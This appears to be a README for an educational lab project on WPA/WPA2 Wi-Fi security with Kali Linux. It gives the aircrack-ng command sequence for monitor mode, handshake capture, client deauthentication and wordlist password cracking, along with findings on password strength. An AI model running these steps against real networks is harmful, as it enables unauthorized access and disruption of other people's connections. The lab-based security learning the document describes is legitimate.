# 🔐 Wi-Fi Security Analysis using Kali Linux

## 📌 Overview
This project demonstrates a hands-on approach to analyzing Wi-Fi security using Kali Linux. The focus is on understanding WPA/WPA2 authentication, handshake capture, and password strength testing.

> ⚠️ This project was conducted in a controlled and authorized lab environment for educational purposes only.

---

## 🎯 Objectives
- Understand WPA/WPA2 security mechanisms
- Capture and analyze handshake packets
- Test password strength using wordlists
- Learn common wireless security vulnerabilities

---

## 🛠️ Tools Used
- Kali Linux
- Aircrack-ng Suite
- Hashcat
- Wireshark

---

## ⚙️ Methodology

### 1. Enable Monitor Mode
```
airmon-ng start wlan0
```

### 2. Scan Available Networks
```
airodump-ng wlan0mon
```

### 3. Capture Handshake
```
airodump-ng -c <channel> --bssid <target-bssid> -w capture wlan0mon
```

### 4. Deauthenticate Client (Lab only)
```
aireplay-ng --deauth 10 -a <bssid> wlan0mon
```

### 5. Analyze Handshake
```
aircrack-ng capture.cap
```

### 6. Password Testing (Wordlist)
```
aircrack-ng capture.cap -w wordlist.txt
```

---

## 📸 Screenshots
Add screenshots in the `screenshots/` folder.

---

## 🔍 Key Findings
- Weak passwords can be easily cracked
- WPA/WPA2 security depends heavily on password strength
- Handshake capture is a critical step in testing

---

## 🧠 Learning Outcomes
- Practical understanding of wireless security
- Exposure to penetration testing tools
- Importance of ethical hacking practices

---

## ⚠️ Disclaimer
This project is strictly for educational purposes. Unauthorized access to networks is illegal.
